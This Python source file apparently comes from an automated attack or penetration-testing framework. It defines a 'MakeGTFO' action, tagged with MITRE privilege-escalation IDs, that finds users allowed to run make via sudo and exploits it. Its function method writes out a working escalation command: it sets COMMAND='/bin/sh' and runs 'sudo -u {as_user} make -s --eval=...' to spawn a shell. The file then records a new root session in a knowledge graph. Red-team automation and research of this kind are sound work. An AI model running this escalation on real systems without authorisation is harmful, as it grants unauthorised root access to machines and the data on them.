from typing import Union

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.action_utils import run_command
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, GraphDB, MultiPattern, Pattern, Relationship
from kg_api.query import Query
from Session import SessionManager


class MakeGTFO(Action):
    """
    Run make command as root.
    """

    def __init__(self):
        super().__init__(
            "MakeGTFO", "T1548", "TA0004", ["quiet", "fast"]
        )
        self.noise = 0.5
        self.impact = 0.8

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action.
        """
        user = pattern.get('user').get('username')
        session = pattern.get('session')._id
        permission = pattern.get('permission')._id
        return [f"Change user to {user} in session ({session}) with permission ({permission})"]

    def get_target_query(self) -> Query:
        """
        get_target_patterns check to identify a user with permission to run the make
        command as root.
        """
        session = Entity('Session', alias='session')
        service = Entity(type='Service', alias='service')        
        user = Entity(type='User', alias='user')

        permission_pattern = (
            user
            .with_edge(Relationship(type='has'))
            .with_node(Entity(type='Permission', alias='permission', command='/usr/bin/make'))
        )
        session_pattern = session.with_edge(Relationship('executes_on')).with_node(service)
        user_service_pattern = user.with_edge(Relationship('is_client')).with_node(service)
        pattern = permission_pattern.combine(user_service_pattern).combine(session_pattern)

        query = Query()
        query.match(pattern)
        query.where(user.username == session.username)
        query.ret_all()
        return query

    def function(
        self, sessions: SessionManager, artefacts: ArtefactManager, pattern: MultiPattern
    ) -> ActionExecutionResult:
        """
        Exploit make command to change user.
        """
        tulpa_session = pattern.get('session')
        tulpa_session_id = tulpa_session.get('id')
        live_session = sessions.get_session(tulpa_session_id)
        permission = pattern.get('permission')
        as_user = permission.get('as_user')

        live_session.run_command("COMMAND='/bin/sh'")
        cmd = rf"sudo -u {as_user} make -s --eval=$'x:\n\t-'" + r'"$COMMAND"'
        output = live_session.run_command(cmd)
        return ActionExecutionResult(
            command=[cmd], stdout=output, session=tulpa_session_id, logs=["Environment variable COMMAND='/bin/sh'"]
        )

    def capture_state_change(
        self, kg: GraphDB, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """
        Update knowledge graph to reflect change in session.
        """
        session = pattern.get('session')
        service = pattern.get('service')

        update_session = session.copy()
        update_session.set('active', False)
        changes: StateChangeSequence = [(session, "update", update_session)]
        root_session = Entity(
            'Session',
            alias='root_session',
            protocol='root',
            username='root',
            active=True,
            id=session.get('id'),
        )
        root_session_with_service = root_session.with_edge(Relationship('executes_on')).with_node(service)
        merge_pattern = update_session.with_edge(Relationship('spawned')).with_node(root_session_with_service)
        changes.append((service, "merge", merge_pattern))

        return changes